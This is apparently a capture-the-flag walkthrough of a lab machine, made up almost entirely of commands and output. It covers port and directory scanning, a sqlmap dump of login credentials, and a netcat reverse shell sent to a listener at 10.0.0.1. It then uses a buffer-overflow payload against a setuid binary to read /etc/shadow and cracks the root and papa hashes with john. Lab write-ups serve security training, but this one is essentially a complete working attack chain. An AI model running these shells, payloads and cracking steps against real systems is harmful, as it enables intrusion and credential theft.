export ip=10.10.192.90

```
nmap scan
$nmap -sC -sV -oN nmap.txt $ip
# Nmap 7.80 scan initiated Wed Jun 24 23:28:49 2020 as: nmap -sC -sV -oN nmap.txt 10.10.192.90
Nmap scan report for 10.10.192.90
Host is up (0.078s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 24 23:29:06 2020 -- 1 IP address (1 host up) scanned in 16.77 seconds

```

```
$ gobuster dir -u http://$ip -x html,php,txt -w ./big.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.192.90
[+] Threads:        10
[+] Wordlist:       ./big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2020/06/24 23:32:23 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/administrator.php (Status: 200)

```
$ip/administrator.php - login form
```
$ sqlmap -u $ip/administrator.php -a --data 'username=&password=' -D users -T users --dump
+----------+------------+
| username | password   |
+----------+------------+
| pingudad | secretpass |
+----------+------------+
```

```
rce panel - 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4445 >/tmp/f

$ nc -lvnp 4445
$ python -c 'import pty; pty.spawn("/bin/bash")'

$ find file / -user pingu 2>/dev/null
$ find file / -user www-data 2>/dev/null
/var/hidden/pass

pingu:pinguapingu
```

```
ls -l root
-r-sr-xr-x 1 root papa 7516 Jan 16 21:07 root
$ scp -i id_rsa pingu@$ip:/opt/secret/root .
$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root

root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::

Segmentation fault

```

```
$ cat shadow: papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow 
 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
postman          (papa)
1g 0:00:00:01 DONE (2020-06-25 00:50) 0.8928g/s 19285p/s 19285c/s 19285C/s 160688..playball
Use the "--show" option to display all of the cracked passwords reliably

papa:postman

```

```
$ cat shadow:
	root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow 

Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
love2fish        (root)
1g 0:00:02:50 DONE (2020-06-25 00:59) 0.005876g/s 1409p/s 1409c/s 1409C/s lovelife07..lossims
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root:love2fish
```